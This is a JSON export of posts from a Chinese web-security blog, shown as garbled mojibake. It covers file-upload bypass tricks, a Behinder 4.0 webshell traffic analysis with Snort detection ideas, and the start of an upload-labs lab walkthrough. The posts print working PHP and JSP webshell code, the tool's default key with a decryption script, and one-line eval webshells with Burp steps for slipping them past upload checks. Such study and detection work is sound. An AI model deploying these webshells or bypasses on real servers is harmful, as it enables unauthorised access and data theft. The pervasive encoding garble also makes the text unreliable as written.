åå°éœ€è¦è¿›è¡Œæ–‡ä»¶ç±»å‹ã€å¤§å°ã€æ¥æºç­‰éªŒè¯ å®šä¹‰ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œåªå…è®¸è®¿é—®æŒ‡å®šæ‰©å±•åçš„æ–‡ä»¶ã€‚ å°†ä¸Šä¼ åçš„æ–‡ä»¶ç”Ÿæˆä¸€ä¸ªéšæœºçš„æ–‡ä»¶åï¼Œå¹¶ä¸”åŠ ä¸Šæ­¤å‰ç”Ÿæˆçš„æ–‡ä»¶æ‰©å±•åã€‚ è®¾ç½®ä¸Šä¼ ç›®å½•æ‰§è¡Œæƒé™ï¼Œé¿å…ä¸æ€€å¥½æ„çš„äººç»•è¿‡å¦‚å›¾ç‰‡æ‰©å±•åè¿›è¡Œæ¶æ„æ”»å‡»ï¼Œæ‹’ç»è„šæœ¬æ‰§è¡Œçš„å¯èƒ½æ€§ã€‚ Webæ–‡ä»¶ä¸Šä¼ ç»•è¿‡å½¢å¼åˆ¤æ–­æ–¹æ³• ä¸Šä¼ ç‚¹ ä¸Šä¼ å¤´åƒ ä¸Šä¼ ç›¸å†Œ ä¸Šä¼ é™„ä»¶ æ·»åŠ æ–‡ç« å›¾ç‰‡ å‰å°ç•™è¨€èµ„æ–™ä¸Šä¼  ç¼–è¾‘å™¨æ–‡ä»¶ä¸Šä¼  åç¼€ç»•è¿‡ PHP Php2, php3, php5, phtml, pht asp Asa, cer, cdx Aspx ascx, ashx, asac jsp jsp, jspx, jspf ç»•è¿‡ç±»å‹ Content-Typeç»•è¿‡ å‰ç«¯ç»•è¿‡ æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ Windowsç¯å¢ƒç‰¹æ€§ç»•è¿‡ æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ åŒå†™ç»•è¿‡ ç‚¹ç©ºæ ¼ç»•è¿‡ æ–‡ä»¶å¤´ç»•è¿‡ æ¡ä»¶ç«äº‰ç»•è¿‡","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"Webå®‰å…¨/æ–‡ä»¶ä¸Šä¼ ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Gryffinbit"},{"title":"å†°è4.0ç‰¹å¾åˆ†æåŠæµé‡æ£€æµ‹æ€è·¯","slug":"å†°è4-0ç‰¹å¾åˆ†æåŠæµé‡æ£€æµ‹æ–¹æ¡ˆ","date":"2022-09-20T09:47:45.000Z","updated":"2024-11-12T07:00:21.000Z","comments":true,"path":"2022/09/20/å†°è4-0ç‰¹å¾åˆ†æåŠæµé‡æ£€æµ‹æ–¹æ¡ˆ/","permalink":"https://gryffinbit.top/2022/09/20/%E5%86%B0%E8%9D%8E4-0%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90%E5%8F%8A%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88/","excerpt":"","text":"å†°è4.0ç‰¹å¾åˆ†æåŠæµé‡æ£€æµ‹æ€è·¯å†°è4.0çš„ä»‹ç»ç®€ä»‹å†°èæ˜¯ä¸€æ¬¾åŸºäºJavaå¼€å‘çš„åŠ¨æ€åŠ å¯†é€šä¿¡æµé‡çš„æ–°å‹Webshellå®¢æˆ·ç«¯ã€‚è€ç‰Œ Webshell ç®¡ç†ç¥å™¨â€”â€”ä¸­å›½èœåˆ€çš„æ”»å‡»æµé‡ç‰¹å¾æ˜æ˜¾ï¼Œå®¹æ˜“è¢«å„ç±»å®‰å…¨è®¾å¤‡æ£€æµ‹ï¼Œå®é™…åœºæ™¯ä¸­è¶Šæ¥è¶Šå°‘ä½¿ç”¨ï¼ŒåŠ å¯† Webshell æ­£å˜å¾—æ—¥è¶‹æµè¡Œã€‚ ç”±äºé€šä¿¡æµé‡è¢«åŠ å¯†ï¼Œä¼ ç»Ÿçš„ WAFã€IDS è®¾å¤‡éš¾ä»¥æ£€æµ‹ï¼Œç»™å¨èƒç‹©çŒå¸¦æ¥è¾ƒå¤§æŒ‘æˆ˜ã€‚å†°èå…¶æœ€å¤§ç‰¹ç‚¹å°±æ˜¯å¯¹äº¤äº’æµé‡è¿›è¡Œå¯¹ç§°åŠ å¯†ï¼Œä¸”åŠ å¯†ç§˜é’¥æ˜¯ç”±éšæœºæ•°å‡½æ•°åŠ¨æ€ç”Ÿæˆï¼Œå› æ­¤è¯¥å®¢æˆ·ç«¯çš„æµé‡å‡ ä¹æ— æ³•æ£€æµ‹ã€‚ æ–°ç‰ˆæœ¬ä¿®å¤é—®é¢˜ï¼š ä¿®å¤äº†åœ¨zimbraç¯å¢ƒä¸‹çš„å…¼å®¹æ€§é—®é¢˜ï¼› ä¿®å¤äº†åœ¨exchangeç¯å¢ƒä¸‹çš„å…¼å®¹æ€§é—®é¢˜ï¼› ä¿®å¤äº†Linuxç¯å¢ƒä¸‹æ‰“å¼€æ–‡ä»¶å¤±è´¥çš„é—®é¢˜ï¼› ä¿®å¤äº†å‘½ä»¤æ‰§è¡Œä¸­è¾“å…¥åæ–œæ å¯¼è‡´åç»­æ— æ³•è¾“å…¥æ–°å‘½ä»¤çš„é—®é¢˜ï¼› ä¿®å¤äº†åˆ—ç›®å½•æ—¶ç›®å½•è·³åŠ¨çš„é—®é¢˜ï¼› ä¿®å¤JDK18+æ‰§è¡Œå‘½ä»¤ä¹±ç çš„é—®é¢˜ï¼› ä¿®å¤å†…ç½‘ç©¿é€æ¨¡å—çš„å‡ ä¸ªå½±å“éš§é“ç¨³å®šæ€§çš„å‡ ä¸ªé—®é¢˜ï¼› ä¿®å¤äº†ä»£ç ç¼–è¾‘æ¡†çš„å¤åˆ¶ç²˜è´´é—®é¢˜ï¼› å…¶ä»–ä¸€äº›ä¼˜åŒ–ï¼› æ–°å¢åŠŸèƒ½ï¼š æ–°å¢æ”¯æŒå¤šçº¿ç¨‹è¶…å¤§æ–‡ä»¶ä¸Šä¼ ã€ä¸‹è½½ï¼› æ–°å¢æ–‡ä»¶æ‰“åŒ…å‹ç¼©ï¼› æ–°å¢æ•°æ®åº“è¿æ¥é…ç½®å¯ä¿å­˜ï¼› å–æ¶ˆç¡¬ç¼–ç é€šä¿¡åè®®ï¼Œä¼ è¾“åè®®å®Œå…¨è‡ªå®šä¹‰ï¼Œå¹¶æ”¯æŒå³æ—¶åœ¨çº¿æ ¡éªŒæµ‹è¯•ã€‚ æ–°å¢å¹³è¡Œä¸–ç•Œæ¨¡å—ï¼Œå¯å¯¹ç›®æ ‡å†…ç½‘èµ„äº§è¿›è¡Œç®¡ç†ï¼› æ–°å¢ä¸»æœºæ‰«æã€ç«¯å£æ‰«æã€æœåŠ¡è¯†åˆ«æ¨¡å—ï¼› æ–°å¢æ”¯æŒJava9~java15+ç‰ˆæœ¬Agentå†…å­˜é©¬ä¸€é”®æ³¨å…¥ï¼› æ–°å¢æ”¯æŒJava Agentæ— æ–‡ä»¶è½åœ°æ³¨å…¥å†…å­˜é©¬ï¼› æ–°å¢å¤šå±‚ç½‘ç»œå­Shellç©¿é€æ¨¡å—ï¼Œå®ç°å¤šå±‚â€èä¸­èâ€ï¼› æ–°å¢ç¦»çº¿æ¨¡å¼ï¼Œè‡ªåŠ¨ç¼“å­˜æ•°æ®ï¼Œå¦‚shellä¸¢å¤±ï¼Œå¯ç¦»çº¿æŸ¥çœ‹å·²ç¼“å­˜å†…å®¹ï¼› å¼€æ”¾æ’ä»¶å¼€å‘æ¨¡å—ï¼Œå¯å¼€å‘è‡ªå®šä¹‰æ’ä»¶ï¼Œå†…ç½®å¤šæ¬¾æ’ä»¶ï¼› æ”¯æŒäºŒè¿›åˆ¶æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¸å†ä¾èµ–webã€‚ å·¥å…·é€šä¿¡åŸç†å†°èçš„é€šä¿¡è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š å¯†é’¥åå•† åŠ å¯†ä¼ è¾“ 1. ç¬¬ä¸€é˜¶æ®µ-å¯†é’¥åå•† 1ï¼‰æ”»å‡»è€…é€šè¿‡ GET æˆ–è€… POST æ–¹æ³•ï¼Œå½¢å¦‚ http://127.0.0.1/shell.aspx?pass=645 çš„è¯·æ±‚æœåŠ¡å™¨å¯†é’¥ï¼› 2ï¼‰æœåŠ¡å™¨ä½¿ç”¨éšæœºæ•° MD5 çš„é«˜16ä½ä½œä¸ºå¯†é’¥ï¼Œå­˜å‚¨åˆ°ä¼šè¯çš„ $_SESSION å˜é‡ä¸­ï¼Œå¹¶è¿”å›å¯†é’¥ç»™æ”»å‡»è€…ã€‚ 2. ç¬¬äºŒé˜¶æ®µ-åŠ å¯†ä¼ è¾“ 1ï¼‰å®¢æˆ·ç«¯æŠŠå¾…æ‰§è¡Œå‘½ä»¤ä½œä¸ºè¾“å…¥ï¼Œåˆ©ç”¨ AES ç®—æ³•æˆ– XOR è¿ç®—è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å‘é€è‡³æœåŠ¡ç«¯ï¼› 2ï¼‰æœåŠ¡ç«¯æ¥å—å¯†æ–‡åè¿›è¡Œ AES æˆ– XOR è¿ç®—è§£å¯†ï¼Œæ‰§è¡Œç›¸åº”çš„å‘½ä»¤ï¼› 3ï¼‰æ‰§è¡Œç»“æœé€šè¿‡AESåŠ å¯†åè¿”å›ç»™æ”»å‡»è€…ã€‚ ç‰¹å¾æ£€æµ‹Acceptå­—æ®µæµé‡ç‰¹å¾ 1Accept: application/json, text/javascript, */*; q=0.01 æ£€æµ‹æ€è·¯ æµè§ˆå™¨å¯æ¥å—ä»»ä½•æ–‡ä»¶ï¼Œä½†æœ€å€¾å‘application&#x2F;jsonå’Œ text&#x2F;javascript è§„åˆ™ file_dataçš„ä½œç”¨å’Œhttp_server_bodyå·®ä¸å¤šï¼Œéƒ½æ˜¯ä½¿contentåŒ¹é…response bodyä¸­çš„å†…å®¹ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ä½¿ç”¨äº†file_dataå…³é”®å­—çš„è§„åˆ™ï¼Œå…¶åœ¨file_dataä¹‹åçš„contentéƒ½ä¼šå—åˆ°å®ƒçš„å½±å“ã€‚file_dataä¹‹åçš„contentéƒ½å¿…é¡»åœ¨response bodyé‡ŒåŒ¹é…ã€‚ Content-Typeæµé‡ç‰¹å¾ 1Content-type: Application/x-www-form-urlencoded æ£€æµ‹æ€è·¯ å¯ä»¥æŠŠè¿™ä¸ªå­—æ®µä½œä¸ºä¸€ä¸ªå¼±ç‰¹å¾ï¼Œè¾…åŠ©å…¶ä»–ç‰¹å¾æ¥æ£€æµ‹ User-agent å­—æ®µæµé‡ç‰¹å¾ å†°èè®¾ç½®äº†10ç§User-Agent,æ¯æ¬¡è¿æ¥shellæ—¶ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªè¿›è¡Œä½¿ç”¨ã€‚ ![image-20220729155845862](&#x2F;Users&#x2F;gryffinbit&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220729155845862.png) æ£€æµ‹æ€è·¯ åœ¨è¾ƒçŸ­è¾ƒç®€å•çš„contentå­—æ®µååŠ ä¸Šfast_patternå…³é”®å­—åˆ™ä¼šä¼˜å…ˆåŒ¹é…è¿™ä¸ªcontentã€‚é¿å…æµªè´¹å¤ªé•¿æ—¶é—´åœ¨åŒ¹é…user-agentä¸Š snortç¼–å†™å¯ä»¥ç”¨contentï¼šâ€œUser-Agentâ€ï¼› contentï¼šâ€œæµè§ˆå™¨ç‰ˆæœ¬â€ã€‚æ¥åŒ¹é…ç›¸åº”çš„åä¸ªæµè§ˆå™¨ ç«¯å£æµé‡ç‰¹å¾ å†°èä¸webshellå»ºç«‹è¿æ¥çš„åŒæ—¶ï¼Œjavawä¹Ÿä¸ç›®çš„ä¸»æœºå»ºç«‹tcpè¿æ¥ï¼Œæ¯æ¬¡è¿æ¥ä½¿ç”¨æœ¬åœ°ç«¯å£åœ¨49700å·¦å³ï¼Œæ¯è¿æ¥ä¸€æ¬¡ï¼Œæ¯å»ºç«‹ä¸€æ¬¡æ–°çš„è¿æ¥ï¼Œç«¯å£å°±ä¾æ¬¡å¢åŠ  æ£€æµ‹æ€è·¯ å¯ä»¥å¯¹ç¬¦åˆè¯¥èŒƒå›´å†…çš„ç«¯å£å‘Šè­¦ PHP webshell ä¸­å­˜åœ¨å›ºå®šä»£ç æµé‡ç‰¹å¾ 12$post=Decrypt(file_get_contents(&quot;php://input&quot;));eval($post); æ£€æµ‹æ€è·¯ contentå­—æ®µä¸­ï¼Œå°†eval($post)ä½œä¸ºæµé‡ç‰¹å¾çº³å…¥ é•¿è¿æ¥æµé‡ç‰¹å¾ å†°èé€šè®¯é»˜è®¤ä½¿ç”¨é•¿è¿æ¥ï¼Œé¿å…äº†é¢‘ç¹çš„æ¡æ‰‹é€ æˆçš„èµ„æºå¼€é”€ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯·æ±‚å¤´å’Œå“åº”å¤´é‡Œä¼šå¸¦æœ‰ Connectionã€‚ Connection: Keep-Alive æ£€æµ‹æ€è·¯ å¯ä»¥ä½œä¸ºè¾…åŠ©çš„æµé‡ç‰¹å¾ å›ºå®šçš„è¯·æ±‚å¤´å’Œå“åº”å¤´æµé‡ç‰¹å¾ è¯·æ±‚å­—èŠ‚å¤´ï¼š 1dFAXQV1LORcHRQtLRlwMAhwFTAg/M å“åº”å­—èŠ‚å¤´ï¼š 1TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd è§£å¯†æŠ¥æ–‡ é€šè¿‡webshellè„šæœ¬ï¼Œé€†å‘åˆ†ææ­ç§˜ç®—æ³• ![image-20220919140750983](&#x2F;Users&#x2F;gryffinbit&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220919140750983.png) 1234567891011121314&lt;?phpfunction decrypt($data)&#123; $key=&quot;e45e329feb5d925b&quot;; $bs=&quot;base64_&quot;.&quot;decode&quot;; $after=$bs($data.&quot;&quot;); for($i=0;$i&lt;strlen($after);$i++) &#123; $after[$i] = $after[$i]^$key[$i+1&amp;15]; &#125; echo $after; return $after;&#125;$data=&quot;TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd9eghDQVwxLhN6M2NDdiAjfXo2B0BcAwQKejN3Rh4DPEZMIV5eSyIJC0QgVVhXASt3XCFfWFsACw9aMFVHWj5KWFwvVV5TUQMPWC8BVXg3IAZ4DAJxdBwBJXE1Vnx2CydyeglLRVguJzZRLG9ZUDQdZWYjcWddPjcUVglVWlckHWxjVFBVDFMUJwBRTEcAAFdicTRcfHoMLBV4DnBEeCYGQngPUFVwIiBTeg5oSHwhJFN8IUt3ajAsSXwneFV8ISRTfCZyVXAlUSx2DnBFeAgsQnghUER0DAYFfCB8A3oINE58JnJVcCIdJ2YycBl8ISRTfCZyVXAlJAV8Jw1HcTMKTXghdgF1HCQYeR5wBnwhJEx7D1wDdjUkBXwneFV8ISRTfCZyVXAlJAV8J3hLeiEnRFcIYV5cJVAVVCx4fHYILEN4MVBEdCI0FHgOeFV8JiAGeg9iB3AlJAV8J3hVfCEkU3wmclV0DCAReDBaA3wlEkFWIltFfTcKG3ggfEh5GCQFeR9yB3AlJBt4IFYDewskU3wmclVwJSQFfCd4VXwhJFN8JnJLdB8nFVQse0JXDz9CeQtxXVonVSl4DnhLeAtdQ3scC0t3DyQFeDBeBHgIMFN8JnJVaSM3KGAODVV8ISRTfCZyVXAlJAVWI1FFYToJdm8iAkJbAVUpeA54S3gLXUN7HAtLdx8kBXgwbAR7JgJTfCZyVXAlJAV8J3hVfCEkU3wmckh0MiwFVlZRXlclEkFWIltFfTcKBXwneFV8ISRTfCZyVXAlJAV8J3gCfC02AEQQUmVRTTZVQQ14VXwhJFN8JnJVcCIsGnkgbEh6ISFYRz9VXVAJLCx2DXhVfCEkU3wmclVwJSQFfCd4VXwmKFMAKVpDDFMQFwAGC2R8JiBNeSFyRXYlEhV6IHRBeyYwBnwqZGJLTQA3RCtuRllJDH9SAgN5Gxs=&quot;;decrypt($data);?&gt; å¾—åˆ°æŠ¥æ–‡å†…å®¹ 1&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;IOmpseWKqOWZqCBFIOS4reeahOWNt+aYryDmlrDliqDljbcNCiDljbfnmoTluo\\/liJflj7fmmK8gMUE2Mi1CMzdGDQoNCiBFOlxwaHBTdHVkeVxQSFBUdXRvcmlhbFxXV1cg55qE55uu5b2VDQoNCjIwMjIvMDcvMjcgIDE1OjQzICAgIDxESVI+ICAgICAgICAgIC4NCjIwMjIvMDcvMjcgIDE1OjQzICAgIDxESVI+ICAgICAgICAgIC4uDQoyMDE3LzAzLzI4ICAxNjo1OSAgICAgICAgICAgICAgICAyOCBpbmRleC5waHANCjIwMTcvMDQvMjAgIDE2OjQ5ICAgICAgICAgICAgMjEsMTc1IGwucGhwDQoyMDEzLzA1LzA5ICAyMDo1NiAgICAgICAgICAgICAgICAyMyBwaHBpbmZvLnBocA0KMjAyMi8wNy8yNiAgMTg6MjUgICAgPERJUj4gICAgICAgICAgcGhwTXlBZG1pbg0KMjAyMi8wNy8yNyAgMTU6NDggICAgICAgICAgICAgICAzMTIgc2hlbGwucGhwDQogICAgICAgICAgICAgICA0IOS4quaWh+S7tiAgICAgICAgIDIxLDUzOCDlrZfoioINCiAgICAgICAgICAgICAgIDMg5Liq55uu5b2VIDEyLDAwOCwwODMsNDU2IOWPr+eUqOWtl+iKgg0K&quot;&#125; å°†æŠ¥æ–‡base64è§£å¯†å¾—åˆ° 12345678910111213141516&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot; é©±åŠ¨å™¨ E ä¸­çš„å·æ˜¯ æ–°åŠ å· å·çš„åºåˆ—å·æ˜¯ 1A62-B37F E:\\phpStudy\\PHPTutorial\\WWW çš„ç›®å½•2022/07/27 15:43 &lt;DIR&gt; .2022/07/27 15:43 &lt;DIR&gt; ..2017/03/28 16:59 28 index.php2017/04/20 16:49 21,175 l.php2013/05/09 20:56 23 phpinfo.php2022/07/26 18:25 &lt;DIR&gt; phpMyAdmin2022/07/27 15:48 312 shell.php 4 ä¸ªæ–‡ä»¶ 21,538 å­—èŠ‚ 3 ä¸ªç›®å½• 12,008,083,456 å¯ç”¨å­—èŠ‚&quot;&#125; å¯ä»¥è·å–åˆ°ç›®å½•ä¿¡æ¯ è¿æ¥å¯†ç æµé‡ç‰¹å¾ï¼š é»˜è®¤æ—¶ï¼Œæ‰€æœ‰å†°è4.0 webshelléƒ½æœ‰â€œe45e329feb5d925bâ€ ä¸€ä¸²å¯†é’¥ã€‚è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond webshellç‰¹å¾JSP webshellä»£ç ç‰¹å¾ 1234567891011121314&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt; &lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] buf = new byte[512]; int length=request.getInputStream().read(buf); while (length&gt;0) &#123; byte[] data= Arrays.copyOfRange(buf,0,length); bos.write(data); length=request.getInputStream().read(buf); &#125; new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);&#125; %&gt; PHP webshellä»£ç ç‰¹å¾ 123@error_reporting(0);$post=Decrypt(file_get_contents(&quot;php://input&quot;));eval($post); è¯·æ±‚å’Œå“åº”è¯·æ±‚å¤´ï¼šdFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M è§£å¯†åï¼š@error_reporting(0);\\r å“åº”å¤´ï¼šTxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd è§£å¯†åï¼š{â€œstatusâ€:â€c3VjY2Vzcw&#x3D;&#x3D;â€,â€msgâ€:â€ å…¶ä¸­â€c3VjY2Vzcw&#x3D;&#x3D;â€ç»è¿‡base64è§£å¯†åçš„å†…å®¹ä¸ºsuccess å†°èè¿æ¥æ—¶ä¸ç”¨è¾“å…¥å¯†ç ï¼Œæ ¹æ®å¯¹å†°èçš„ä½¿ç”¨åˆ†æï¼Œå†°è4.0å¯ä»¥åœ¨åˆå§‹æ—¶è‡ªå®šä¹‰è¿æ¥å¯†ç  è¦è®¾ç½®è‡ªå®šä¹‰å¯†ç ï¼Œéœ€è¦åœ¨æœ¬åœ°å’Œè¿œç¨‹åŠ è§£å¯†å‡½æ•°ä¸­éƒ½ä¿å­˜$key è¿™æ ·çš„è¯ï¼Œå¦‚æœå¯¹æ–¹æ›´æ¢å¯†ç ï¼Œåˆå§‹å­—ç¬¦ä¸²ç»è¿‡å¯†é’¥åŠ å¯†ï¼Œé‚£ä¹ˆå®ƒçš„è¯·æ±‚å¤´å’Œå“åº”å¤´éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™å°±éœ€è¦é’ˆå¯¹webshellä¸­çš„$keyåŠ¨æ€æ”¹å˜è§£å¯†å‡½æ•°æ‰èƒ½çš„åˆ°è§£å¯†åå›ºå®šçš„è¯·æ±‚å¤´å’Œå“åº”å¤´ å¦å¤–ï¼Œæ¯æ¬¡å‘èµ·è¿æ¥æ—¶éƒ½ä¼šå‘å‡ºä¸¤æ¬¡httpè¯·æ±‚ï¼Œé»˜è®¤è¿æ¥å¯†é’¥ä¸‹ï¼Œæ‰€æœ‰å“åº”å¤´éƒ½ç›¸åŒï¼Œç¬¬äºŒæ¬¡è¯·æ±‚å¤´æ¯”è¾ƒç‰¹æ®Šï¼Œåˆæ¬¡ä¹‹å¤–ï¼Œæ‰€æœ‰çš„è¯·æ±‚å¤´éƒ½ç›¸åŒã€‚ ç¬¬ä¸€æ¬¡è¯·æ±‚è§£å¯† 1dFAXQV1LORcHRQtLRlwMAhwFTAg/M @error_reporting(0);\\r ç¬¬äºŒæ¬¡è¯·æ±‚è§£å¯† 1OT8AQUBWFDoQUBRWQEELC1MdVRoJNGwDF1sHTVtaDEVZVAxdGh0RDQNBAU9X error_reporting(0);\\r å‚è€ƒæ–‡ç« https://cloud.tencent.com/developer/article/1621021","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æµé‡åˆ†æ","slug":"Webå®‰å…¨/æµé‡åˆ†æ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"å†°è4.0","slug":"å†°è4-0","permalink":"https://gryffinbit.top/tags/%E5%86%B0%E8%9D%8E4-0/"}],"author":"Gryffinbit"},{"title":"upload-labsé¶åœºæ–‡ä»¶ä¸Šä¼ ","slug":"upload-labsé¶åœºæ–‡ä»¶ä¸Šä¼ ","date":"2022-09-16T16:16:29.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/09/17/upload-labsé¶åœºæ–‡ä»¶ä¸Šä¼ /","permalink":"https://gryffinbit.top/2022/09/17/upload-labs%E9%9D%B6%E5%9C%BA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"å‰è¨€Webæ–‡ä»¶ä¸Šä¼ æ–¹æ³•æ€»ç»“ï¼Œè·³è½¬Blogï¼šhttps://gryffinbit.top/2022/09/20/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/ å®éªŒç¯å¢ƒdocker hubé¶åœºï¼šhttps://hub.docker.com/r/c0ny1/upload-labs è…¾è®¯äº‘ï¼šUbuntu Server 20.04 LTS 64bit é¶åœºæ­å»ºä¸‹è½½ 12wget -c &quot;https://github.com/c0ny1/upload-labs/archive/refs/heads/master.zip&quot;unzip master.zip åˆ›å»ºé•œåƒ 12cd upload-labs/dockerdocker build -t upload-labs . åˆ›å»ºå®¹å™¨ 1docker run -d -p 80:80 upload-labs:latest Pass-01çŸ¥è¯†ç‚¹è§£ææ€è·¯: å‰ç«¯JSç»•è¿‡ï¼š åˆ¤æ–­æ˜¯å¦å­˜åœ¨jsç»•è¿‡æ¼æ´ï¼š æ‰“å¼€è°ƒè¯•é¢æ¿ï¼Œé€‰æ‹©ç½‘ç»œï¼Œç„¶åä¸Šä¼ å›¾ç‰‡æ–‡ä»¶å’Œéå›¾ç‰‡æ–‡ä»¶ï¼Œç„¶åå¯¹è¿™ä¸¤ä¸ªæ–‡ä»¶çš„å˜åŒ–è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç½‘ç»œä¸­æ²¡æœ‰æ•°æ®å˜åŒ–ï¼Œè¯´æ˜å­˜åœ¨jså‰ç«¯éªŒè¯æ¼æ´ï¼Œå¦‚æœæœ‰å˜åŒ–è¯´æ˜ä¸å­˜åœ¨ã€‚(æœ‰å˜åŒ–è¯´æ˜ï¼Œå‰ç«¯æ²¡æœ‰åšéªŒè¯ï¼Œæ˜¯æŠŠæ–‡ä»¶ä¼ è¾“åˆ°åå°ï¼Œåœ¨åå°è¿›è¡ŒéªŒè¯çš„ï¼Œæ‰€ä»¥æ‰ä¼šæœ‰ç½‘ç»œè¯·æ±‚ã€‚) ç»•è¿‡æ–¹å¼-åˆ é™¤æˆ–ç¦ç”¨jsï¼š åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥about:configç‚¹å‡»æ¥å— åœ¨æœç´¢æ¡†ä¸­è¾“å…¥javascriptç„¶åæ‰¾åˆ°javascript.enabledé€‰é¡¹åŒå‡»ï¼Œå‡ºç°false: å¯ä»¥ä¸Šä¼ äº† ç»•è¿‡æ–¹å¼-ä½¿ç”¨ä»£ç†ä¸Šä¼ æ–‡ä»¶ï¼ˆburpsuiteã€å†°èã€èšå‰‘ç­‰ï¼‰ æŠ“å–æ•°æ®åŒ…ï¼Œä¿®æ”¹filenameé‡Œé¢çš„æ–‡ä»¶æ ¼å¼ï¼Œå†forwardå‘åŒ… æ”»ç•¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨å‰ç«¯JSç»•è¿‡ä¸Šä¼ pngï¼Œå¯ä»¥æˆåŠŸä¸Šä¼  ä¸Šä¼ phpï¼Œæç¤ºå¤±è´¥ï¼Œä½†ç½‘ç»œå¹¶æ²¡æœ‰å‘èµ·è¯·æ±‚ æ‰€ä»¥å­˜åœ¨jså‰ç«¯ç»•è¿‡æ¼æ´ ç»•è¿‡ ç¦ç”¨jsçš„æ–¹å¼ ç¦ç”¨js ä¸Šä¼ æˆåŠŸ é‡‡ç”¨burpsuiteæ”¹åŒ…çš„æ–¹å¼ æŠŠtest.phpåç¼€æ”¹ä¸ºjpg 1&lt;?php @eval($_REQUEST[&#x27;666&#x27;]); ?&gt; å¼€å¯burpsuiteï¼Œæµè§ˆé€‰æ‹©test.jpgï¼Œå…ˆä¸è¦ç‚¹ç‚¹å‡»ï¼Œå¼€å¯bpçš„æŠ“åŒ…åŠŸèƒ½ ä¿®æ”¹æŠ“å–åˆ°çš„æ•°æ®åŒ…ï¼Œæ”¹æˆphpçš„åç¼€ ä¸Šä¼ æˆåŠŸ åœ¨æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹æ˜¯å¦æœ‰è¯¥æ–‡ä»¶ å› ä¸ºæ˜¯ç”¨dockeræ­çš„ç¯å¢ƒï¼Œéœ€è¦è¿›å…¥åˆ°dockerçš„å‘½ä»¤è¡Œä¸­æŸ¥çœ‹ã€‚ 1docker exec -it a47af352776f /bin/bash 1ls ä¸Šä¼ æˆåŠŸ è®¿é—® å…³äºdockeræ–‡ä»¶æ˜ å°„çš„ä¸€ä¸ªå…³ç³»ã€‚dockerå¯åŠ¨çš„æ—¶å€™ï¼Œå¼€å¯äº†apacheæœåŠ¡ ã€‚æ‰€ä»¥è®¿é—®http://ip:80çš„æ—¶å€™ï¼Œå°±æ˜¯è®¿é—®äº†apacheçš„é»˜è®¤æ ¹ç›®å½•`/var/www/html`ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥å»è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œéœ€è¦è®¿é—®`http://ip:80/upload/readme.php` ï¼ˆå³åœ¨dockerä¸­çš„è·¯å¾„å…³ç³»ï¼Œé»˜è®¤&#x2F;var&#x2F;www&#x2F;htmlä¸ºæ ¹ç›®å½•ï¼‰ èšå‰‘å¤–é“¾ ä¸Šä¼ äº†ant.phpï¼Œé€šè¿‡èšå‰‘å»é“¾æ¥ã€‚ 1&lt;?php eval($_POST[&#x27;ant&#x27;]); ?&gt; â€‹ Pass-02çŸ¥è¯†ç‚¹è§£æ æ”»ç•¥ åˆ¤æ–­æ˜¯å¦ä¸ºå‰ç«¯JSç»•è¿‡ ä¸Šä¼ 